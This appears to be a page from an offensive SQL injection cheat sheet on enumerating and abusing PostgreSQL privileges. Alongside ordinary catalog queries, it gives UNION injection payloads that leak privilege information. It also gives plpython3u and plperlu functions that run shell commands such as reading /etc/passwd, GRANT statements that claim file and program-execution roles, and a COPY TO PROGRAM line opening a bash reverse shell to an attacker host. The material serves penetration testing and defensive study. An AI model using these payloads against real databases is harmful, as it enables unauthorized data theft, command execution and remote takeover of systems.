---
title: Privileges
description: Understanding and checking PostgreSQL privileges for SQL injection attacks
category: Information Gathering
order: 15
tags: ["privileges", "permissions", "superuser"]
lastUpdated: 2025-12-07
---

## Privileges

Understanding PostgreSQL privileges is crucial for determining what actions are possible during an SQL injection attack. Privilege information can reveal whether you can access files, execute commands, or perform other sensitive operations.

### Checking Superuser Status

The most important privilege check:

```sql
-- Check if current user is superuser
SELECT current_setting('is_superuser');
-- Returns 'on' or 'off'

-- Alternative method
SELECT usesuper FROM pg_user WHERE usename = current_user;
-- Returns 't' (true) or 'f' (false)

-- Using pg_roles
SELECT rolsuper FROM pg_roles WHERE rolname = current_user;
```

### User Privileges

```sql
-- Get all role attributes for current user
SELECT
    rolname,
    rolsuper,
    rolinherit,
    rolcreaterole,
    rolcreatedb,
    rolcanlogin,
    rolreplication
FROM pg_roles
WHERE rolname = current_user;
```

### Key Privilege Attributes

| Privilege     | Description                        | Exploitation Potential             |
| ------------- | ---------------------------------- | ---------------------------------- |
| `SUPERUSER`   | Full administrative access         | Read/write files, execute commands |
| `CREATEDB`    | Can create databases               | Create rogue databases             |
| `CREATEROLE`  | Can create new roles               | Create privileged accounts         |
| `REPLICATION` | Can initiate streaming replication | Data exfiltration                  |
| `BYPASSRLS`   | Bypass row level security          | Access restricted data             |

### Table-Level Privileges

```sql
-- Check privileges on specific table
SELECT grantee, privilege_type
FROM information_schema.table_privileges
WHERE table_name = 'users';

-- Check all privileges for current user
SELECT table_schema, table_name, privilege_type
FROM information_schema.table_privileges
WHERE grantee = current_user;
```

### Schema Privileges

```sql
-- Check schema privileges
SELECT nspname, nspacl
FROM pg_namespace
WHERE nspname = 'public';
```

### Function Privileges

```sql
-- Check if user can execute specific function
SELECT has_function_privilege(current_user, 'pg_read_file(text)', 'execute');
```

### File Operation Privileges

Superuser can access file system functions:

```sql
-- Check if pg_read_file is available
SELECT has_function_privilege('pg_read_file(text)', 'execute');

-- Check if COPY TO/FROM is available
-- Requires superuser or specific grants
SELECT current_setting('is_superuser');
```

### Injection Examples

```sql
-- Check if superuser
' UNION SELECT NULL,current_setting('is_superuser'),NULL--

-- Get all privileges
' UNION SELECT NULL,string_agg(privilege_type,','),NULL FROM information_schema.table_privileges WHERE grantee=current_user--

-- Check specific capability
' UNION SELECT NULL,CASE WHEN usesuper THEN 'SUPERUSER' ELSE 'NOT SUPERUSER' END,NULL FROM pg_user WHERE usename=current_user--

-- List all superusers
' UNION SELECT NULL,string_agg(usename,','),NULL FROM pg_user WHERE usesuper=true--
```

### Important System Functions

Functions requiring superuser:

| Function                  | Description                  |
| ------------------------- | ---------------------------- |
| `pg_read_file()`          | Read files from disk         |
| `pg_read_binary_file()`   | Read binary files            |
| `pg_ls_dir()`             | List directory contents      |
| `COPY ... TO/FROM`        | File I/O operations          |
| `lo_import()/lo_export()` | Large object file operations |

### Checking Extension Capabilities

```sql
-- List installed extensions
SELECT extname, extversion FROM pg_extension;

-- Check for dangerous extensions
SELECT * FROM pg_extension WHERE extname IN ('adminpack', 'file_fdw', 'dblink');
```

### Procedural Language Enumeration (pg_language)

Procedural languages determine what code can be executed within PostgreSQL. Untrusted languages (ending in 'u') allow arbitrary code execution.

**Important:** Untrusted languages like `plpython3u`, `plperlu`, and `pltclu` are **not installed by default**. They must be explicitly installed via `CREATE EXTENSION` by a superuser. Additionally, **only superusers can create functions in untrusted languages** unless privileges have been explicitly granted (which is rare and typically a misconfiguration).

**Listing Available Languages:**

```sql
-- List all installed languages
SELECT lanname, lanpltrusted, lanacl
FROM pg_language;

-- Find untrusted languages (command execution potential)
SELECT lanname FROM pg_language WHERE lanpltrusted = false;
-- Dangerous results: plpython3u, plperlu, pltclu, plsh
```

**Language Security Levels:**

| Language     | Trusted | Risk Level   | Notes                 |
| ------------ | ------- | ------------ | --------------------- |
| `sql`        | Yes     | Low          | Standard SQL only     |
| `plpgsql`    | Yes     | Low          | Procedural SQL        |
| `plpython3u` | **No**  | **Critical** | Full Python access    |
| `plperlu`    | **No**  | **Critical** | Full Perl access      |
| `pltclu`     | **No**  | **Critical** | Full Tcl access       |
| `plsh`       | **No**  | **Critical** | Direct shell access   |
| `c`          | **No**  | **Critical** | Native code execution |

**Check Language Creation Privilege:**

```sql
-- Check if user can create functions in untrusted languages
SELECT has_language_privilege(current_user, 'plpython3u', 'usage');
SELECT has_language_privilege(current_user, 'plperlu', 'usage');
SELECT has_language_privilege(current_user, 'pltclu', 'usage');

-- Check all language privileges
SELECT l.lanname,
       has_language_privilege(current_user, l.lanname, 'usage') as can_use
FROM pg_language l
WHERE lanpltrusted = false;
```

**Exploiting Untrusted Languages:**

**Caution:** These examples require: (1) the language extension to be installed (`CREATE EXTENSION plpython3u`), and (2) the current user to have `USAGE` privilege on the language — which by default is restricted to superusers. Check with `has_language_privilege()` before attempting.

```sql
-- If plpython3u is available and user has USAGE privilege
CREATE OR REPLACE FUNCTION cmd(c TEXT) RETURNS TEXT AS $$
import subprocess
return subprocess.check_output(c, shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT cmd('id');
SELECT cmd('cat /etc/passwd');

-- If plperlu is available and user has USAGE privilege
CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
my $cmd = shift;
return `$cmd`;
$$ LANGUAGE plperlu;

SELECT cmd('whoami');
```

### Dangerous Default Roles (PostgreSQL 10+)

PostgreSQL 10+ introduced predefined roles with dangerous capabilities:

```sql
-- Check membership in dangerous roles
SELECT pg_has_role(current_user, 'pg_read_server_files', 'member') as read_files,
       pg_has_role(current_user, 'pg_write_server_files', 'member') as write_files,
       pg_has_role(current_user, 'pg_execute_server_program', 'member') as exec_program;

-- List all members of dangerous roles
SELECT r.rolname AS dangerous_role, m.rolname AS member
FROM pg_auth_members am
JOIN pg_roles r ON am.roleid = r.oid
JOIN pg_roles m ON am.member = m.oid
WHERE r.rolname IN (
    'pg_read_server_files',
    'pg_write_server_files',
    'pg_execute_server_program',
    'pg_read_all_data',
    'pg_write_all_data'
);
```

**Dangerous Default Roles:**

| Role                        | Capability               | Exploitation                         |
| --------------------------- | ------------------------ | ------------------------------------ |
| `pg_read_server_files`      | Read any file            | `SELECT pg_read_file('/etc/passwd')` |
| `pg_write_server_files`     | Write any file           | `COPY ... TO '/path/file'`           |
| `pg_execute_server_program` | Execute OS commands      | `COPY ... TO PROGRAM 'cmd'`          |
| `pg_read_all_data`          | Read all tables          | Bypass table permissions             |
| `pg_write_all_data`         | Write all tables         | Modify any data                      |
| `pg_signal_backend`         | Send signals to backends | Terminate connections                |

**Granting Dangerous Roles (if CREATEROLE):**

```sql
-- If user has CREATEROLE privilege, they can grant these roles
GRANT pg_read_server_files TO current_user;
GRANT pg_write_server_files TO current_user;
GRANT pg_execute_server_program TO current_user;

-- Now use the capabilities
SELECT pg_read_file('/etc/passwd');
COPY (SELECT 'backdoor') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
```

### Object Ownership Enumeration

```sql
-- Find objects owned by current user
SELECT c.relname, c.relkind, n.nspname
FROM pg_class c
JOIN pg_namespace n ON c.relnamespace = n.oid
WHERE c.relowner = (SELECT oid FROM pg_roles WHERE rolname = current_user);

-- Find functions owned by current user
SELECT proname, prosrc
FROM pg_proc
WHERE proowner = (SELECT oid FROM pg_roles WHERE rolname = current_user);
```

### Injection Examples for Privilege Enumeration

```sql
-- Check for untrusted languages
' UNION SELECT 1, lanname, 3 FROM pg_language WHERE lanpltrusted=false--

-- Check dangerous role membership
' UNION SELECT 1, pg_has_role(current_user,'pg_execute_server_program','member')::text, 3--

-- List all role attributes
' UNION SELECT 1, rolname||':'||rolsuper::text||':'||rolcreaterole::text, 3 FROM pg_roles WHERE rolname=current_user--

-- Check CREATEROLE privilege
' UNION SELECT 1, rolcreaterole::text, 3 FROM pg_roles WHERE rolname=current_user--
```

### Role Membership

```sql
-- Check role memberships
SELECT r.rolname as role, m.rolname as member
FROM pg_auth_members am
JOIN pg_roles r ON am.roleid = r.oid
JOIN pg_roles m ON am.member = m.oid;

-- Check if current user is member of specific role
SELECT pg_has_role(current_user, 'admin', 'member');
```

### Notes

- Superuser privileges are required for most file operations
- Even non-superusers may have dangerous permissions through role inheritance
- Always check both direct privileges and inherited roles
- Some extensions grant additional capabilities
